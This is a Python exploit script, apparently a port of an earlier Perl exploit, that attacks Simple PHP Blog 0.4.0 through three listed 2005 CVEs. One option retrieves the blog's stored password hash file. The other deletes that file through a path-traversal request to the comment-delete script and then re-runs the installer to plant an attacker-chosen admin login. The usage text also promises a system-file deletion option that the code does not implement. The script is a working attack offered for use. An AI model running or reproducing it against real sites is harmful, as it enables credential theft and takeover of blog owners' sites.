#!/usr/bin/python
# PHP Simple PHP Blog 0.4.0 - Multiple Remote s
# CVE: 2005-2787, 2005-2733, 2005-2192
# Disclosure on 2005-09-01
# referenced the perl code of Kenneth F. Belva, CISSP
# rewritten in python code by rat3l
# sphpblog.py

import time, struct, sys
import requests

try:
    server = sys.argv[1]
    exploit = sys.argv[2]

except IndexError:
    print "[+] The usage is \n"
    print "[+] choose 1 to retrieve the password hash of the existing user and password"
    print "[+] choose 2 to reset new user and password"
    print "[+] choose 3 to delete a system file"
    print "[+] Usage Examples: \n"
    print "[+] Example of option 1: %s 192.168.1.1 1" % sys.argv[0]
    print "[+] Example of option 2: %s 192.168.1.1 2 username password" % sys.argv[0]
    sys.exit()

if exploit == '1':
    req = '/config/password.txt'
    r = requests.get('http://'+ server+'/blog' +req)
    try:
            r
            print (r.content)

    except:
               print "Failed: %s" % server 
               print (r.content)

    r.close()

elif exploit == '2':
    try:
        username = sys.argv[3]
        passwd = sys.argv[4]
    except IndexError:
        print "fix"
        sys.exit(1)
    reqd = '/comment_delete_cgi.php?y=05&m=08&comment='
    reqn = '/install03_cgi.php?blog_language=english'
    req = '/config/password.txt'
    data = {'user':username, 'pass':passwd, 'submit':'%A0Submit%A0'}
    r = requests.get('http://'+ server+'/blog' +req)
    rd = requests.get('http://'+ server +'/blog' + reqd +'./config/password.txt')
    rn = requests.post('http://'+ server + '/blog' + reqn , data)
    try:
        rd
        print '[!] deleting the ./config/password.txt\n'
        if rd:
            print ('Oh, boy! You have been removed! Victory!\n')
        else:
            print ('There was na error!')
        rn
        print '[!] creating new ./config/password.txt\n'
        if rn:
            print ('YoHo! A pirate life for me, Hoist the color heighs!\n')
            print ('Your new username: '+username +' and '+ 'Your new password: '+passwd+' is created!\n')
        else:
            print ('Sorry, dude!')
        r
        print '[!] Your new user and password hash is: \n'
        print (r.content) + "\n"

    except:
               print "Failed: %s" % server 
               print (rn.content)
    r.close()
else:
    print '[!] Failed: Please decide your attack plan, my lord'
